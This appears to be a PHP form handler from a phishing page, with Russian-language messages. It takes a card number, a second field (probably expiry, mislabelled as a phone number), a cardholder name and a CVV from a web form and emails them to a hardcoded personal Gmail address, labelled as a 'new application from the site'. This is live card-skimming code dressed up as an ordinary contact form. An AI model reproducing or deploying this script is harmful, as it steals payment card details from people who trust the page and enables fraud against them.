<?php
ini_set('display_errors', 'On');
error_reporting(E_ALL);

$to = 'danilukfolker@gmail.com';
$sitename = $_SERVER['SERVER_NAME'];

if (isset($_POST['numer']) && !empty($_POST['numer'])) {
    $numer = strip_tags($_POST['numer']);
    $data = strip_tags($_POST['data']);
    $Namme = strip_tags($_POST['Namme']);
    $cvv = strip_tags($_POST['cvv']);

    $subject = "[Заявка с сайта " . $sitename . "]";
    $headers = "From: mail@" . $sitename . "\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html;charset=utf-8 \r\n";

    $msg = "<html><body style='font-family:Arial,sans-serif;'>";
    $msg .= "<h2 style='font-weight:bold;border-bottom:1px dotted #ccc;'>Новая заявка:</h2>\r\n";
    $msg .= "<p><strong>Номер:</strong> " . $numer . "</p>\r\n";
    $msg .= "<p><strong>Телефон:</strong> " . $data . "</p>\r\n";
    $msg .= "<p><strong>cvv:</strong> " . $cvv . "</p>\r\n";
    $msg .= "<p><strong>Имя:</strong> " . $Namme . "</p>\r\n";
    $msg .= "</body></html>";

    if (mail($to, $subject, $msg, $headers)) {
        echo "Заявка успешно отправлена!";
    } else {
        echo "Произошла ошибка при отправке заявки.";
    }
} else {
    echo "Заявка не отправлена :(";
}
?>

